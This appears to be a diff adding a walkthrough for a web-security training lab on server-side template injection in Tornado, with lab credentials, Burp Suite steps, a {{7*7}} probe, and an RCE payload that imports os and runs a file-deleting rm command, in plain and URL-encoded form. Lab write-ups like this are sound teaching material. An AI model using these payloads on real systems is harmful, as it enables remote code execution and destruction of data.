@@ -1,0 +1,61 @@
+Description:
+This lab is vulnerable to Server-Side Template Injection (SSTI) due to unsafe usage of a Tornado template.
+
+Steps to Solve:
+1️-Identify the Injection Point
+-Log in using:
+wiener:peter
+-Post a comment on any blog post.
+-Go to My account page.
+-Notice the preferred name feature:
+-It sends a POST request with parameter:
+blog-post-author-display
+-Possible values:
+user.name
+user.first_name
+user.nickname
+
+2️-Intercept the Request
+-In Burp Suite:
+Go to Proxy → HTTP history
+-Find:
+POST /my-account/change-blog-post-author-display
+-Send it to Repeater
+
+3️-Test for SSTI
+-Tornado template syntax:
+{{ someExpression }}
+-Inject payload:
+user.name}}{{7*7}}
+-After sending the request, reload your comment page.
+
+-If you see:
+Peter Wiener49}}
+
+→ This confirms SSTI vulnerability.
+
+4️-Achieve Remote Code Execution (RCE)
+-Tornado allows executing Python code:
+{% somePython %}
+-Use Python os module:
+os.system()
+
+5️-Exploit the Vulnerability
+-Payload:
+{% import os %}
+{{os.system('rm /home/carlos/morale.txt')}}
+
+-URL-encoded payload:
+user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
+
+-Insert into:
+blog-post-author-display
+Send the request via Burp Repeater.
+
+6️-Trigger the Payload
+-Reload the page containing your comment.
+
+Result:
+-Arbitrary Python code execution achieved
+-File deleted:
+-/home/carlos/morale.txt
